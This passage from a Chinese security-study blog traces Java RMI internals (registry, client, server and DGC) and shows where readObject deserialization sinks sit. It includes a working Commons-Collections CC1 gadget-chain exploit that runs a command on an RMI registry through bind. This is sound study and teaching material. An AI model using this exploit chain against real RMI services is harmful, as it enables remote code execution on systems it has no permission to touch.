的方法调用\nInitialContext.lookup\nldapURLContext.lookup\nldapURLContext.lookup\nGenericURLContext.lookup\nGenericURLContext.lookup\nPartialCompositeContext.lookup.p_lookup\nComponentContext.p_lookup.c_lookup\nLdapCtx.c_lookup\n从上面是通过 p_lookup.c_lookup 进入到 decodeObject 中，这里是重点要关注的，\ndecodeObject\n进入 decodeObject，先要进入一个 getURLClassLoader ，\ngetURLClassLoader 中的 trustURLCodebase 默认是 false ,不执行 newInstance 实例化，这里虽然已经获取到字节码了，只是不实例化就无法加载，也就无法命令执行。\n接着往下走，来到了 deserializaObject ，\ndecodeObject.deserializaObject\n而 deserializaObject 对象中恰好有 readObject ，字节码在此处被反序列化造成漏洞。\ndeserializaObject.readObject\n参考文章： https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-Jndi-%E7%BB%93%E5%90%88-ldap\nhttp://101.36.122.13:4000/2025/03/08/JNDI%E4%B8%93%E9%A2%98/\nhttps://www.bilibili.com/video/BV1ct4y1h79t\n","permalink":"http://localhost:1313/xvsf/posts/jndi/","summary":"\u003ch1 id=\"一jndi-简介\"\u003e一、JNDI 简介\u003c/h1\u003e\n\u003cp\u003eJNDI(Java Naming and Directory Interface，Java命名和目录接口) 是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。\u003c/p\u003e","title":"JNDI"},{"content":"1、RMI是什么 Java RMI用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法，只不过是允许被远程调用的对象要通过一些标志加以标识。这样做的特点如下：\n优点：避免重复造轮子；\n缺点：调用过程很慢，而且该过程是不可靠的，容易发生不可预料的错误，比如网络错误等；\n在RMI中的核心是远程对象（remote object），除了对象本身所在的虚拟机，其他虚拟机也可以调用此对象的方法，而且这些虚拟机可以不在同一个主机上。每个远程对象都要实现一个或者多个远程接口来标识自己，声明了可以被外部系统或者应用调用的方法（当然也有一些方法是不想让人访问的）。\n2、RMI 基本实现 客户端 java\r1 2 3 4 5 6 7 8 9 10 package com.example; import java.rmi.Remote; import java.rmi.RemoteException; public interface IRemoteObj extends Remote { public String sayHello(String keywords) throws RemoteException; } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 package com.example; import java.rmi.NotBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class RMIClient { public static void main(String[] args) throws RemoteException, NotBoundException { Registry registry = LocateRegistry.getRegistry(\u0026#34;127.0.0.1\u0026#34;, 1099); IRemoteObj remoteObj = (IRemoteObj) registry.lookup(\u0026#34;remoteObj\u0026#34;); remoteObj.sayHello(\u0026#34;hello\u0026#34;); } } 服务端 java\r1 2 3 4 5 6 7 8 9 10 package com.example; import java.rmi.Remote; import java.rmi.RemoteException; public interface IRemoteObj extends Remote { public String sayHello(String keywords) throws RemoteException; } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package com.example; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RemoteObjImpl extends UnicastRemoteObject implements IRemoteObj { public RemoteObjImpl() throws RemoteException { } @Override public String sayHello(String keywords) { String upKeywords = keywords.toUpperCase(); System.out.println(upKeywords); return upKeywords; } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.example; import java.rmi.AlreadyBoundException; import java.rmi.NotBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class RMIServer { public static void main(String[] args) throws RemoteException, AlreadyBoundException, NotBoundException { IRemoteObj remoteObj = new RemoteObjImpl(); Registry r = LocateRegistry.createRegistry(1099); r.bind(\u0026#34;remoteObj\u0026#34;, remoteObj); } } RMI 客户端通过远程调用服务端的 sayHello 方法，成功在服务端输出了大写的“HELLO”。\n3、流程原理 3.1 服务端-创建远程服务 调试分析远程对象的创建过程：\n进入其构造函数，\n**UnicastRemoteObject **中 ，port 被默认赋值为 0\n步入 UnicastRemoteObject 类中的 exportObject （姑且称为导出对象函数）\npublic static：不需要创建 UnicastRemoteObject 实例也可以调用 Remote obj：实现了 java.rmi.Remote 接口的对象， int port： 接收客户端的请求 接下进入 return exportObject(obj, new UnicastServerRef(port)); 中的 new UnicastServerRef(port))，UnicastServerRef（称之为服务端引用）\nvar 1 这里是端口号 port ，传入 port 后，调用 父类构造函数 LiveRef,\n来到 LiveRef 的构造函数\n这里可以看一下 getLocalEndpoint\n这里的 TCPEndpoint 用于远程通信，其构造函数中的变量 String var1 为 host (ip) 、int var2 为 port (端口)\n继续跟入 this(var1, TCPEndpoint.getLocalEndpoint(var2), true); 中的 this，在此处 ep 中有了IP和端口信息\nEndpoint ep 端点信息（IP、端口、socket） Channel ch 通信通道（缓存的连接） isLoacl 是否为本地对象 然后这些信息都被存放在 LiveRef 中。\n接下来又调用了父类方法并将 ref 赋值为 var1（var1:LiveRef@626）\n接下来回到 return exportObject(obj, new UnicastServerRef(port)); 中的 exportObject 方法\n首先判断了 obj 是否继承了 UnicastRemoteObject ，如果没有继承那么就把 ref 设置为 sref。\n之后都使用 sref.exportObject 进行工作完成导出远程对象的操作\n而 sref 中封装着 LiveRef@626\nsref.exportObject 的执行过程：\nstub = Util.createProxy(implClass, getClientRef(), forceStubUse);这一步是创建客户端代理的过程。\n（为什么要在服务端创建客户端代理呢？）\n这里通过流程图解释：服务端首先创建好 Remote Stub 放到注册中心，客户端通过注册中心拿到 Remote Stub，客户端通过 Remote Stub 调用另一个代理 Remote Skeleton ，之后 Remote Skeleton 调用服务端。\n步入 createProxy\nclientRef 中存放的就是那个核心 LiveRef@783 （上文是 LiveRef@626，核心都是相同的）\n此处进行了判断：\nforceStubUse：如果为 true，就强制使用旧的 静态 Stub 类（由 rmic 工具生成的 _Stub.class）这是为了兼容 JDK 1.1 时代的 RMI，这种情况直接调用 createStub(...) 去加载和实例化 Stub ignoreStubClasses：如果为 true，表示忽略静态 Stub 类。这时会尝试用 动态代理（java.lang.reflect.Proxy）来生成 Stub stubClassExists： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 private static boolean stubClassExists(Class\u0026lt;?\u0026gt; remoteClass) { //先看缓存：withoutStubs 用来存放 “已经确定没有 Stub 的类” if (!withoutStubs.containsKey(remoteClass)) { try { //尝试用 Class.forName 加载 [远程类名 + \u0026#34;_Stub\u0026#34;] 这个类 Class.forName(remoteClass.getName() + \u0026#34;_Stub\u0026#34;, false, remoteClass.getClassLoader()); return true; //如果能加载成功，说明确实存在 Stub 类 } catch (ClassNotFoundException cnfe) { // 如果加载不到，说明这个远程类没有对应的 \u0026#34;_Stub\u0026#34; // 那么就把它记到 withoutStubs 缓存里，下次查询就直接返回 false withoutStubs.put(remoteClass, null); } } return false; //如果缓存里已有，或者加载失败，就返回 false } 如果要进入 createStub ，强制使用 StubforceStubUse == true，没有忽略 Stub 并且存在 Stub 类ignoreStubClasses == false``stubClassExists(remoteClass) == true\n下一步创建动态代理\n其中的 handler 存放 LiveRef@783\n这样就创建好了动态代理 stub\n进入 Target （实际上是将目前创建的东西都封装到一起）\n客户端引用（stub）和服务端引用（disp）的 LiveRef 是一样的，\n接下来，将封装好的 target 发布出去\n跟到了 TCPTransport 类中的 exportObject\nlisten() 函数先获取 TCPEndpoint@823\n准备创建 ServerSocket\n判断 port 是否为 0，如果为 0 ，进入 setDefaultPort，设置端口号\njava\r1 2 if (listenPort == 0) setDefaultPort(server.getLocalPort(), csf, ssf); 进入 server.getLocalPort\n在这个函数中端口被赋值，此端口随机，\n这个时候的端口被赋值为 55685\ndoPrivileged： 表示即使调用栈上其他代码没有权限，也允许这里的操作按本方法的权限执行。 NewThreadAction： 创建一个新的线程 这个线程开启之后等待客户端的连接\n做完这些之后，用 MAP 表储存 target，target 中包括了 IP、端口、服务端代理、客户端代理等信息\n最后返回一些值，完成了服务端的发布过程。\n到这里在返回看 exportObject 函数的作用：\n静态方法的 exportObject 传入俩个参数，创建一个 UnicastServerRef 对象 sref ，sref 中封装了IP、端口等信息，核心是 LiveRef@xxx，然后调用 exportObject(obj, sref) 重载方法的 exportObject 返回代理对象 stub 这样就做到了把一个本地的远程对象实例导出成一个可以远程访问的对象 3.2 注册中心-创建注册中心+绑定 调用 createRegistry 创建注册中心，默认端口号为1099\n到了这一步点“恢复程序”，如果继续跟进去会发现一堆奇怪的东西\n来到这一步：\n创建了一个 LiveRef，一个 lref，（这里的作用和服务端的实际上是一样的）\n3.3 客户端-请求注册中心 首先连接注册中心，接收传入的IP和端口\n使用LIveRef ，将传入的 host,port,等封装\n再次调用 createProxy 方法，同样的创建了 stub ，（这里的创建是通过注册中心传入参数（host,port..），客户端自行创建 stub）\n来到下一步：\n问题：在动态调试时遇到报错，可能是服务端没有开启！ 下一步调用会报以下错误，因为服务端没有开启监听\n将 RMIServer 运行起来就可以了\n这里看到传进来的 var1 实际上就是IRemoteObj remoteObj = (IRemoteObj) registry.lookup(\u0026quot;remoteObj\u0026quot;);中的 remoteObj\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException { try { //创建远程调用对象 RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L); try { //序列化参数，将 var1 写入输出流 ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(var1); } catch (IOException var18) { throw new MarshalException(\u0026#34;error marshalling arguments\u0026#34;, var18); } //发起远程调用， super.ref.invoke(var2); Remote var23; try { ///从输入流中读取远程 registry 返回的对象 ObjectInput var6 = var2.getInputStream(); // var23 = (Remote)var6.readObject(); } catch (IOException var15) { throw new UnmarshalException(\u0026#34;error unmarshalling return\u0026#34;, var15); } catch (ClassNotFoundException var16) { throw new UnmarshalException(\u0026#34;error unmarshalling return\u0026#34;, var16); } finally { super.ref.done(var2); } return var23; } catch (RuntimeException var19) { throw var19; } catch (RemoteException var20) { throw var20; } catch (NotBoundException var21) { throw var21; } catch (Exception var22) { throw new UnexpectedException(\u0026#34;undeclared checked exception\u0026#34;, var22); } } 跟进 invoke\nsuper.ref.invoke(var2);\nStreamRemoteCall 类中的 executeCall 是真正处理网络请求的方法\nexecuteCall 中有一步通过反序列化处理异常，如果注册中心有恶意对象，客户端在此处反序列化时被攻击。\n由于 executeCall 是客户端网络请求的必经之路，所以这个反序列化几乎不可避免\n这里的 lookup 方法的作用就是去注册中心查找远程对象\n3.4 客户端-请求服务端 同样注意开启服务端\n来到了 invoke\n这里又跟到了 StreamRemoteCall ，这样的请求同样可以被攻击\n结束 call.executeCall(); 后会出现另一个反序列化点\n进入 unmarshalValue\nunmarshalValue 函数的作用就是根据目标类型，选择正确的方式从输入流中读取数据。\n对基本类型，用专门的 readxxx() 方法读取，再返回 对对象类型，直接调用 readObject() 反序列化 returnValue 返回了 \u0026ldquo;HELLO\u0026rdquo;\n总结-客户端产生的反序列化漏洞点 StreamRemoteCall.executeCall StreamRemoteCall 类中的 executeCall 是真正处理网络请求的方法\nexecuteCall 中有一步通过反序列化处理异常，如果注册中心有恶意对象，客户端在此处反序列化时被攻击。\n由于 executeCall 是客户端网络请求的必经之路，所以这个反序列化几乎不可避免\nexecuteCall 处理的协议就是JRMP 协议\nunmarshalValue unmarshalValue 函数向服务端请求获取返回值时，返回值是通过反序列化产生的。\n3.5 注册中心-客户端请求时 前面说过，服务端创建了 stub 并将信息封装到 target，随后的 NewThreadAction 创建了一个新的线程，等待客户端的响应\n这个线程开启之后等待客户端的连接\n现在进入创建线程的流程：\n进入 run() 后，只能调用 executeAcceptLoop，executeAcceptLoop 又创建了一个新的线程\nrun 调用了 run0\nrun0 前面都是在解析一些协议，重点是 handleMessages\n其中的 默认情况是调用了 serviceCall\nserviceCall 会从表中获取 target\n此处断点调试：\n可以看到断点处的 stub 就是服务端创建好的东西\n之后会调用 disp.dispatch，disp 是一个分发器，用于将远程请求分发到服务端执行\n这里 skel 不为空就会调用 oldDispatch\nskel.dispatch\n而 skel.dispatch 是属于 RegistryImpl_Skel 类中的 dispatch\n接下来就到了重点：\nRegistryImpl_Skel.class\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception { if (var4 != 4905912898345647071L) { throw new SkeletonMismatchException(\u0026#34;interface hash mismatch\u0026#34;); } else { RegistryImpl var6 = (RegistryImpl)var1; switch (var3) { case 0: String var100; Remote var103; try { ObjectInput var105 = var2.getInputStream(); var100 = (String)var105.readObject(); var103 = (Remote)var105.readObject(); } catch (IOException var94) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var94); } catch (ClassNotFoundException var95) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var95); } finally { var2.releaseInputStream(); } var6.bind(var100, var103); try { var2.getResultStream(true); break; } catch (IOException var93) { throw new MarshalException(\u0026#34;error marshalling return\u0026#34;, var93); } case 1: var2.releaseInputStream(); String[] var99 = var6.list(); try { ObjectOutput var102 = var2.getResultStream(true); var102.writeObject(var99); break; } catch (IOException var92) { throw new MarshalException(\u0026#34;error marshalling return\u0026#34;, var92); } case 2: String var98; try { ObjectInput var104 = var2.getInputStream(); //此处为注册中心，直接调用了反序列化 var98 = (String)var104.readObject(); } catch (IOException var89) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var89); } catch (ClassNotFoundException var90) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var90); } finally { var2.releaseInputStream(); } Remote var101 = var6.lookup(var98); try { ObjectOutput var9 = var2.getResultStream(true); var9.writeObject(var101); break; } catch (IOException var88) { throw new MarshalException(\u0026#34;error marshalling return\u0026#34;, var88); } case 3: Remote var8; String var97; try { ObjectInput var11 = var2.getInputStream(); var97 = (String)var11.readObject(); var8 = (Remote)var11.readObject(); } catch (IOException var85) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var85); } catch (ClassNotFoundException var86) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var86); } finally { var2.releaseInputStream(); } var6.rebind(var97, var8); try { var2.getResultStream(true); break; } catch (IOException var84) { throw new MarshalException(\u0026#34;error marshalling return\u0026#34;, var84); } case 4: String var7; try { ObjectInput var10 = var2.getInputStream(); var7 = (String)var10.readObject(); } catch (IOException var81) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var81); } catch (ClassNotFoundException var82) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var82); } finally { var2.releaseInputStream(); } var6.unbind(var7); try { var2.getResultStream(true); break; } catch (IOException var80) { throw new MarshalException(\u0026#34;error marshalling return\u0026#34;, var80); } default: throw new UnmarshalException(\u0026#34;invalid method number\u0026#34;); } } } 总结-注册中心产生的漏洞点 客户端在请求时 （IRemoteObj remoteObj = (IRemoteObj) registry.lookup(\u0026quot;remoteObj\u0026quot;);），lookup的对象是序列化后传到注册中心的，而注册中心的 **RegistryImpl_Skel **中，大部分 case 的函数都有反序列化。如果是一个恶意序列化对象，在注册中心运行到 **RegistryImpl_Skel **时，会产生反序列化漏洞 var98 = (String)var104.readObject(); 3.6 服务端-客户端请求时 过程和注册中心被客户端请求时一样，但要注意，调试的时候需要代理是动态代理，按 F9 让程序往下运行直到得到动态代理。\n图中的 RegistryImpl_Stub DGCImpl_Stub 都不是想要的\n最终拿到的 $Proxy0 是我们需要的动态代理\n同样来到 disp.dispatch\n不一样的是在 skel != null判断时，此时的 skel 为空，不进入 oldDispatch\n继续走，获取远程方法 sayHello\n之后会进入 unmarshalValue，在 客户端产生的反序列化漏洞点 中也有 unmarshalValue\n最终在 result = method.invoke(obj, params); 这一步完成远程调用\n3.7 DGC-客户端请求服务端 分布式垃圾回收，又称DGC，RMI使用DGC来做垃圾回收，因为跨虚拟机的情况下要做垃圾回收没办法使用原有的机制。我们使用的远程对象只有在客户端和服务端都不受引用时才会结束生命周期。\n而既然RMI依赖于DGC做垃圾回收，那么在RMI服务中必然会有DGC层，在yso中攻击DGC层对应的是JRMPClient，在攻击RMI Registry小节中提到了skel和stub对应的Registry的服务端和客户端，同样的，DGC层中也会有skel和stub对应的代码，也就是DGCImpl_Skel和DGCImpl_Stub，我们可以直接从此处分析，避免冗长的debug。\n而客户端一方在使用服务端的远程引用时需要调用dirty来注册，在用完时需要调用clean进行清除。\nDGCImpl_Stub\nclean 就是”强”清除内存，dirty 就是”弱”清除内存\n这里调用了 readObject() 方法，存在反序列化的入口类。\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 public void clean(ObjID[] var1, long var2, VMID var4, boolean var5) throws RemoteException { try { RemoteCall var6 = super.ref.newCall(this, operations, 0, -669196253586618813L); try { ObjectOutput var7 = var6.getOutputStream(); var7.writeObject(var1); var7.writeLong(var2); var7.writeObject(var4); var7.writeBoolean(var5); } catch (IOException var8) { throw new MarshalException(\u0026#34;error marshalling arguments\u0026#34;, var8); } super.ref.invoke(var6); super.ref.done(var6); } catch (RuntimeException var9) { throw var9; } catch (RemoteException var10) { throw var10; } catch (Exception var11) { throw new UnexpectedException(\u0026#34;undeclared checked exception\u0026#34;, var11); } } public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException { try { RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L); try { ObjectOutput var6 = var5.getOutputStream(); var6.writeObject(var1); var6.writeLong(var2); var6.writeObject(var4); } catch (IOException var20) { throw new MarshalException(\u0026#34;error marshalling arguments\u0026#34;, var20); } super.ref.invoke(var5); Lease var24; try { ObjectInput var9 = var5.getInputStream(); var24 = (Lease)var9.readObject(); } catch (IOException var17) { throw new UnmarshalException(\u0026#34;error unmarshalling return\u0026#34;, var17); } catch (ClassNotFoundException var18) { throw new UnmarshalException(\u0026#34;error unmarshalling return\u0026#34;, var18); } finally { super.ref.done(var5); } return var24; } catch (RuntimeException var21) { throw var21; } catch (RemoteException var22) { throw var22; } catch (Exception var23) { throw new UnexpectedException(\u0026#34;undeclared checked exception\u0026#34;, var23); } } DGCImpl_Skel\n也存在漏洞点\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception { if (var4 != -669196253586618813L) { throw new SkeletonMismatchException(\u0026#34;interface hash mismatch\u0026#34;); } else { DGCImpl var6 = (DGCImpl)var1; switch (var3) { case 0: ObjID[] var39; long var40; VMID var41; boolean var42; try { ObjectInput var14 = var2.getInputStream(); var39 = (ObjID[])var14.readObject(); var40 = var14.readLong(); var41 = (VMID)var14.readObject(); var42 = var14.readBoolean(); } catch (IOException var36) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var36); } catch (ClassNotFoundException var37) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var37); } finally { var2.releaseInputStream(); } var6.clean(var39, var40, var41, var42); try { var2.getResultStream(true); break; } catch (IOException var35) { throw new MarshalException(\u0026#34;error marshalling return\u0026#34;, var35); } case 1: ObjID[] var7; long var8; Lease var10; try { ObjectInput var13 = var2.getInputStream(); var7 = (ObjID[])var13.readObject(); var8 = var13.readLong(); var10 = (Lease)var13.readObject(); } catch (IOException var32) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var32); } catch (ClassNotFoundException var33) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var33); } finally { var2.releaseInputStream(); } Lease var11 = var6.dirty(var7, var8, var10); try { ObjectOutput var12 = var2.getResultStream(true); var12.writeObject(var11); break; } catch (IOException var31) { throw new MarshalException(\u0026#34;error marshalling return\u0026#34;, var31); } default: throw new UnmarshalException(\u0026#34;invalid method number\u0026#34;); } } } 4、RMI的几种攻击方式 https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/\n4.1 攻击注册中心 攻击点还是在 RegistryImpl_Skel 代码中的反序列化，\ncase 的对应关系如下：\ncase0 \u0026ndash; bind java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 case 0: String var100; Remote var103; try { ObjectInput var105 = var2.getInputStream(); var100 = (String)var105.readObject(); var103 = (Remote)var105.readObject(); } catch (IOException var94) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var94); } catch (ClassNotFoundException var95) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var95); } finally { var2.releaseInputStream(); } var6.bind(var100, var103); try { var2.getResultStream(true); break; } catch (IOException var93) { throw new MarshalException(\u0026#34;error marshalling return\u0026#34;, var93); } case1 \u0026ndash; list list 这里没有 readObject ，无法攻击 java\r1 2 3 4 5 6 7 8 9 10 11 case 1: var2.releaseInputStream(); String[] var99 = var6.list(); try { ObjectOutput var102 = var2.getResultStream(true); var102.writeObject(var99); break; } catch (IOException var92) { throw new MarshalException(\u0026#34;error marshalling return\u0026#34;, var92); } case2 \u0026ndash; lookup java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 case 2: String var98; try { ObjectInput var104 = var2.getInputStream(); var98 = (String)var104.readObject(); } catch (IOException var89) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var89); } catch (ClassNotFoundException var90) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var90); } finally { var2.releaseInputStream(); } Remote var101 = var6.lookup(var98); try { ObjectOutput var9 = var2.getResultStream(true); var9.writeObject(var101); break; } catch (IOException var88) { throw new MarshalException(\u0026#34;error marshalling return\u0026#34;, var88); } case3 \u0026ndash; rebind java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 case 3: Remote var8; String var97; try { ObjectInput var11 = var2.getInputStream(); var97 = (String)var11.readObject(); var8 = (Remote)var11.readObject(); } catch (IOException var85) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var85); } catch (ClassNotFoundException var86) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var86); } finally { var2.releaseInputStream(); } var6.rebind(var97, var8); try { var2.getResultStream(true); break; } catch (IOException var84) { throw new MarshalException(\u0026#34;error marshalling return\u0026#34;, var84); } case4 \u0026ndash; unbind java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 case 4: String var7; try { ObjectInput var10 = var2.getInputStream(); var7 = (String)var10.readObject(); } catch (IOException var81) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var81); } catch (ClassNotFoundException var82) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var82); } finally { var2.releaseInputStream(); } var6.unbind(var7); try { var2.getResultStream(true); break; } catch (IOException var80) { throw new MarshalException(\u0026#34;error marshalling return\u0026#34;, var80); } 4.1.1 bind\u0026amp;rebind 调用 bind 时，会反序列化参数名和远程对象，如果服务端存在 cc 链\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 case 0: String var100; Remote var103; try { //首先注册中心接收客户端请求，根据请求的 bind 方法进入 case0 分支， ObjectInput var105 = var2.getInputStream(); //然后进行反序列化 //第一个对象必须是 String var100 = (String)var105.readObject(); //第二个对象被强转为 Remote var103 = (Remote)var105.readObject(); } catch (IOException var94) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var94); } catch (ClassNotFoundException var95) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var95); } finally { var2.releaseInputStream(); } var6.bind(var100, var103); try { var2.getResultStream(true); break; } catch (IOException var93) { throw new MarshalException(\u0026#34;error marshalling return\u0026#34;, var93); } EXP： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.rmi.Remote; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.HashMap; import java.util.Map; public class AttackRegistryEXP { public static void main(String[] args) throws Exception{ Registry registry = LocateRegistry.getRegistry(\u0026#34;127.0.0.1\u0026#34;,1099); InvocationHandler handler = (InvocationHandler) CC1(); //Proxy.newProxyInstance(...)：创建一个动态代理（JDK 动态代理），使之实现 Remote 接口并使用上面得到的 handler 来处理方法调用 //这一步的作用是把构造的对象包装成 Remote 类型，以便能作为 bind 的第二个参数 Remote remote = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),new Class[] { Remote.class }, handler)); //向目标 RMI registry 发送请求，触发反序列化 registry.bind(\u0026#34;sTring\u0026#34;,remote); } //下面就是以前分析过的 CC1 链 （TransformedMap 版 ） public static Object CC1() throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;value\u0026#34;); Map\u0026lt;Object, Object\u0026gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer); Class c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Target.class, transformedMap); return o; } } 首先导入 commons-collections 3.2.1\nxml\r1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 需要注意，服务端和攻击端的项目应一致——都是 maven ，否则攻击无效；如果不在一个项目，都要添加 commons-collections 依赖。\nrebind 和 bind 一样，不再赘述。\n4.1.2 lookup\u0026amp;unbind java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 case 2: String var98; try { ObjectInput var104 = var2.getInputStream(); //读取输入流传来的 var98 并反序列化，这里对应的应该是 lookup 参数 var98 = (String)var104.readObject(); } catch (IOException var89) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var89); } catch (ClassNotFoundException var90) { throw new UnmarshalException(\u0026#34;error unmarshalling arguments\u0026#34;, var90); } finally { var2.releaseInputStream(); } //这里调用注册表查找对象，返回 Remote 类型并放在 var101 Remote var101 = var6.lookup(var98); try { ObjectOutput var9 = var2.getResultStream(true); var9.writeObject(var101); break; } catch (IOException var88) { throw new MarshalException(\u0026#34;error marshalling return\u0026#34;, var88); } lookup 只能传入一个 String 类型\n分析 lookup 的功能，然后伪造 lookup 代码，达到目的：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException { try { //newCll 构造远程调用对象 RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L); try { //序列化lookup 传入的输入流 ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(var1); } catch (IOException var18) { throw new MarshalException(\u0026#34;error marshalling arguments\u0026#34;, var18); } //把上面序列化后的调用真正发往远端、执行远端方法。此处是把 lookup(var1) 请求发送到 RMI 服务器端并等待响应。 super.ref.invoke(var2); Remote var23; try { ObjectInput var6 = var2.getInputStream(); var23 = (Remote)var6.readObject(); } catch 